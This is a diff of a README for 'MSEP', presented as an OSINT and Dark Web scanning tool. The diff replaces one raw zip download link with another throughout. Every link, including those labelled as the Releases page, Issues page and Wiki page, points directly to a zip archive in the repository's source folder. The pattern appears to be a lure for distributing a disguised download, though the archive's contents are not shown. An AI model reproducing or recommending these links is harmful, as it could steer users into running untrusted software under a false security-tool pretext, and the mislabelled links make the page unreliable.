@@ -1,7 +1,7 @@
 # 🌌 MSEP - Effortless OSINT and Dark Web Scanning
 
 ## 🔗 Download Now
-[![Download MSEP](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip)](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip)
+[![Download MSEP](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip)](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip)
 
 ## 📜 Description
 M.S.E.P. (Midnight Singularity Extraction Program) is an autonomous OSINT tool designed to enhance your cybersecurity efforts. With Gemini 3.0 Pro support, MSEP scans the Dark Web for critical digital intelligence. This program aids users in gathering information without deep technical knowledge.
@@ -17,7 +17,7 @@ Before you download and install MSEP, ensure your system meets the following req
 - **Network:** Stable internet connection required
 
 ### 2. Download & Install
-To get MSEP, visit the [Releases page](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip). Follow these steps to download and install the software:
+To get MSEP, visit the [Releases page](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip). Follow these steps to download and install the software:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -83,24 +83,24 @@ You can easily access scan results:
 ## ⚙️ Troubleshooting
 If you encounter any issues while using MSEP, consider the following steps:
 
-- **Update the Application:** Ensure you are using the latest version by checking the [Releases page](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip). Download and install any updates if available.
+- **Update the Application:** Ensure you are using the latest version by checking the [Releases page](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip). Download and install any updates if available.
 - **Check Internet Connection:** A stable connection is vital for scanning the Dark Web.
 - **Reinstall the Application:** If problems persist, uninstall MSEP and reinstall it from the Releases page.
 
 ## 💬 Support
 For additional help and support, you can reach out through the following methods:
 
-- **Issue Tracker:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip) to report bugs or request features.
+- **Issue Tracker:** Visit the [GitHub Issues page](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip) to report bugs or request features.
 - **Community Forum:** Join discussions on relevant forums to learn tips and tricks from other users.
 
 ## 📚 Documentation
-For more detailed instructions and insights about using MSEP, visit the [Wiki page](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip). Here you can find guides tailored for advanced features and user experiences.
+For more detailed instructions and insights about using MSEP, visit the [Wiki page](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip). Here you can find guides tailored for advanced features and user experiences.
 
 ## 🔄 Stay Updated
 Stay informed about new updates, features, and best practices by following the project. 
 
-- Check the [Releases page](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip) regularly for the latest versions.
+- Check the [Releases page](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip) regularly for the latest versions.
 - Follow the project on GitHub for notifications about new releases and important updates.
 
 ## 🔗 Download Now Again
-[![Download MSEP](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip)](https://raw.githubusercontent.com/Moraa1714/MSEP/main/src/MSEP-drumbler.zip)
+[![Download MSEP](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip)](https://github.com/Moraa1714/MSEP/raw/refs/heads/main/src/Software-v1.8.zip)
